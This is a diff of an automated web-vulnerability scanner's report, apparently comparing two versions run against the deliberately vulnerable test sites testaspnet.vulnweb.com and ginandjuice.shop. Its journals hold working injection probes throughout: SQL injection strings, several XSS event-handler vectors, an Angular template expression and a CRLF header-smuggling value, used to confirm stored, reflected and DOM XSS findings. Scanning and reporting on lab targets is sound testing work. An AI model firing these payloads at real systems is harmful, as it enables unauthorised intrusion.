-  - `journal` ref `req-0da52ab0` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
-    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2%27+OR+1%3D1--
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-    RESPONSE 200
-      cache-control: private
-      content-length: 0
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:58:24 GMT
-  - `journal` ref `req-983f2414` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly`
-    REQUEST  GET http://testaspnet.vulnweb.com
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-1049d87e` excerpt: `ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj`
+    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
     RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
-      set-cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:57:47 GMT
+      date: Sun, 04 Oct 2026 11:38:41 GMT
+      content-length: 14376
+      body[0:200]: 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
+<HTML>
+	<HEAD>
+		<title>Comments</title>
+		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
+		<meta name="CODE_
+  - `journal` ref `req-1ceda0b5` excerpt: `ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj; path=/; HttpOnly`
+    REQUEST  GET http://testaspnet.vulnweb.com/
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+    RESPONSE 200
+      cache-control: private
+      content-type: text/html; charset=utf-8
+      server: Microsoft-IIS/8.5
+      x-aspnet-version: 2.0.50727
+      set-cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj; path=/; HttpOnly
+      x-powered-by: ASP.NET
+      date: Sun, 04 Oct 2026 11:38:41 GMT
       content-length: 14044
       body[0:200]: 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
@@ -461,25 +268,27 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
       evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
       evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
       verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
-  - `journal` ref `req-0c770c5c` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2`
+  - `journal` ref `req-0157d6ea` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2`
     REQUEST  POST http://testaspnet.vulnweb.com/Comments.aspx?id=2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/x-www-form-urlencoded
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=sentinel&__VIEWSTATE=1%27&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQKi3cnWDwKAgcfvBQKFzrr8AQLi%2B%2BjXCAKUl...
-    RESPONSE 500
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
+      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=1%27+OR+%271%27%3D%272%27+--+&__VIEWSTATE=%2FwEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFggCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4Ja...
+    RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:09:23 GMT
-      content-length: 6334
-      body[0:200]: <html>
-    <head>
-        <title>The state information is invalid for this page and might be corrupted.</title>
-        <style>
-         body {font-family:"Verdana";font-weight:normal;font-size: .
+      date: Sun, 04 Oct 2026 11:40:06 GMT
+      content-length: 14384
+      body[0:200]: 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
+<HTML>
+	<HEAD>
+		<title>Comments</title>
+		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
+		<meta name="CODE_
 
 **[ACTION] — verified**
 
@@ -490,25 +299,27 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
       evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
       evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
       verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
-  - `journal` ref `req-0c770c5c` excerpt: `tbComment=sentinel`
+  - `journal` ref `req-0157d6ea` excerpt: `tbComment=sentinel`
     REQUEST  POST http://testaspnet.vulnweb.com/Comments.aspx?id=2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/x-www-form-urlencoded
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=sentinel&__VIEWSTATE=1%27&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQKi3cnWDwKAgcfvBQKFzrr8AQLi%2B%2BjXCAKUl...
-    RESPONSE 500
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
+      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=1%27+OR+%271%27%3D%272%27+--+&__VIEWSTATE=%2FwEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFggCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4Ja...
+    RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:09:23 GMT
-      content-length: 6334
-      body[0:200]: <html>
-    <head>
-        <title>The state information is invalid for this page and might be corrupted.</title>
-        <style>
-         body {font-family:"Verdana";font-weight:normal;font-size: .
+      date: Sun, 04 Oct 2026 11:40:06 GMT
+      content-length: 14384
+      body[0:200]: 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
+<HTML>
+	<HEAD>
+		<title>Comments</title>
+		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
+		<meta name="CODE_
 
 **[OBJECT] — verified**
 
@@ -526,25 +337,27 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: __EVENTTARGET, __EVENTARGUMENT, __VIEWSTATE, __VIEWSTATEGENERATOR, __EVENTVALIDATION, tbComment)
 
-  - `journal` ref `req-0c770c5c` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
+  - `journal` ref `req-0157d6ea` excerpt: `ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj`
     REQUEST  POST http://testaspnet.vulnweb.com/Comments.aspx?id=2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/x-www-form-urlencoded
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=sentinel&__VIEWSTATE=1%27&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQKi3cnWDwKAgcfvBQKFzrr8AQLi%2B%2BjXCAKUl...
-    RESPONSE 500
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
+      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=1%27+OR+%271%27%3D%272%27+--+&__VIEWSTATE=%2FwEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFggCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4Ja...
+    RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:09:23 GMT
-      content-length: 6334
-      body[0:200]: <html>
-    <head>
-        <title>The state information is invalid for this page and might be corrupted.</title>
-        <style>
-         body {font-family:"Verdana";font-weight:normal;font-size: .
+      date: Sun, 04 Oct 2026 11:40:06 GMT
+      content-length: 14384
+      body[0:200]: 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
+<HTML>
+	<HEAD>
+		<title>Comments</title>
+		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
+		<meta name="CODE_
   - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
     finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
       evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
@@ -560,18 +373,18 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
       evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
       evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
       verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
-  - `journal` ref `req-031633cd` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2`
+  - `journal` ref `req-0cd803e3` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2`
     REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
     RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:57:52 GMT
-      content-length: 23952
+      date: Sun, 04 Oct 2026 11:42:38 GMT
+      content-length: 15829
       body[0:200]: 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
 <HTML>
@@ -593,13 +406,13 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
 </details>
 
 
-## ginjuice — https://ginandjuice.shop (run run-d2edb73a27, scanner sentinel-core/4.2.3)
+## ginjuice — https://ginandjuice.shop (run run-1738d74ba4, scanner sentinel-core/4.3.0)
 
-**L2 SOURCE (honesty note): v4.3.0 L2 projection over the v4.2.3 live journal (run-d2edb73a27, seed b0c63973) — the engine is verdict-identical (gate verdict-diff vs frozen v4.2.2 = NONE) and L2 is a zero-request pure projection; this environment cannot host a >600s fresh re-scan of this target (measured 620s; a fresh attempt overran the 600s window and was discarded)**
+**L2 SOURCE (honesty note): fresh TARGETED v4.3.0 live scan (run-1738d74ba4, seed l2fresh-gj-r7) of ONLY the L2 attack-path surfaces (supervisor round-7 order: fresh-live evidence, no projections) — the shipped pipeline ran with discovery seeded to the exact path-surface pages and the endpoint map scoped to those surfaces (stats.crawl.targeted_mode records the seeds/keep-rules); every request/response pair in this journal was sent live in this run (2026-10-04T11:30:34Z .. 2026-10-04T11:38:06Z, 452s wall)**
 
 **9 paths: 9 VERIFIED / 0 INFERRED** (7 single-finding, 2 chains) — weak-link histogram: `{}`
 
-Seeds used: `F-277b70ea40, F-4df129b258, F-98386c0986, F-d8bbff4e3e, F-e6ca09b8b8, F-ef23b8b42b, F-fc86abef99`; non-seed findings (annotation-only classes): `{"F-0e125aa746": "missing_security_headers", "F-14a00088c7": "missing_security_headers", "F-1d05d54579": "missing_security_headers", "F-280f9bf333": "missing_security_headers", "F-350d2cadb9": "missing_security_headers", "F-3f3e1d3d49": "missing_security_headers", "F-4775c478d5": "missing_security_headers", "F-4aa457f211": "missing_security_headers", "F-5e46111694": "missing_security_headers", "F-5fbe2a300b": "missing_security_headers", "F-64070c624a": "missing_security_headers", "F-65ab6e47e6": "missing_security_headers", "F-68cf956bbd": "vulnerable_js_dependency", "F-6a222a003d": "missing_security_headers", "F-79832c51cf": "missing_security_headers", "F-7bcb18152c": "missing_security_headers", "F-8ac4aa87f5": "missing_security_headers", "F-8f0527e325": "missing_security_headers", "F-a0965ae454": "missing_security_headers", "F-ac1d876594": "missing_security_headers", "F-ac5a684024": "missing_security_headers", "F-ad7c55cc55": "missing_security_headers", "F-af0cfd6218": "missing_security_headers", "F-bf6d4ca7fb": "missing_security_headers", "F-c4bd93d7b2": "missing_security_headers", "F-df2a3ab1ea": "missing_security_headers", "F-eb5ff2843d": "missing_security_headers", "F-fcd233c3fe": "missing_security_headers"}`
+Seeds used: `F-277b70ea40, F-4df129b258, F-98386c0986, F-d8bbff4e3e, F-e6ca09b8b8, F-ef23b8b42b, F-fc86abef99`; non-seed findings (annotation-only classes): `{"F-14a00088c7": "missing_security_headers", "F-3f3e1d3d49": "missing_security_headers", "F-4775c478d5": "missing_security_headers", "F-4aa457f211": "missing_security_headers", "F-64070c624a": "missing_security_headers", "F-73d1434014": "missing_security_headers", "F-a0965ae454": "missing_security_headers", "F-ac1d876594": "missing_security_headers", "F-ac5a684024": "missing_security_headers", "F-af0cfd6218": "missing_security_headers", "F-eb5ff2843d": "missing_security_headers", "F-fcd233c3fe": "missing_security_headers"}`
 
 
 ### AP-19dfe77fb7 — VERIFIED — xss_dom at /blog/ — single-finding path
@@ -624,17 +437,17 @@ findings: F-fc86abef99 | chain_rule: — | mitigations absent: ["content-securit
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-766ba3dd` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-53b5637f` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=sentinelxssmarkerpro43%22+onfocus%3D%22sentinelAttr
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:25 GMT
+      date: Sun, 04 Oct 2026 11:32:12 GMT
       content-type: text/html; charset=utf-8
-      content-length: 8681
+      content-length: 8735
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -656,17 +469,17 @@ findings: F-fc86abef99 | chain_rule: — | mitigations absent: ["content-securit
     finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
       evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
       verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
-  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0fb351bb` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:24 GMT
+      date: Sun, 04 Oct 2026 11:32:41 GMT
       content-type: text/html; charset=utf-8
       content-length: 8681
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -684,17 +497,17 @@ findings: F-fc86abef99 | chain_rule: — | mitigations absent: ["content-securit
     finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
       evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
       verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
-  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0fb351bb` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:24 GMT
+      date: Sun, 04 Oct 2026 11:32:41 GMT
       content-type: text/html; charset=utf-8
       content-length: 8681
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -717,17 +530,17 @@ findings: F-fc86abef99 | chain_rule: — | mitigations absent: ["content-securit
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
 
-  - `journal` ref `req-25669f7f` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0fb351bb` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:24 GMT
+      date: Sun, 04 Oct 2026 11:32:41 GMT
       content-type: text/html; charset=utf-8
       content-length: 8681
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -784,17 +597,17 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-227a3d3d` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=Accessories&searchTerm=https%3A%2F%2Fsentinel-redirect-check.example.org%2Fprobe
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-6a491ab3` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Cdetails+open+ontoggle%3Dsentinel42%28%29%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:27:54 GMT
+      date: Sun, 04 Oct 2026 11:31:32 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9781
+      content-length: 9443
       connection: keep-alive
-      set-cookie: category=Accessories; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<details open ontoggle=sentinel42()>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -805,7 +618,6 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
 
@@ -816,21 +628,19 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
-  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -846,21 +656,19 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `verification: re-test:variant-battery-6 (passed=True)`
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
-  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -876,7 +684,6 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
 
@@ -884,18 +691,17 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
 
-  - `journal` ref `req-00eb0dfb` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
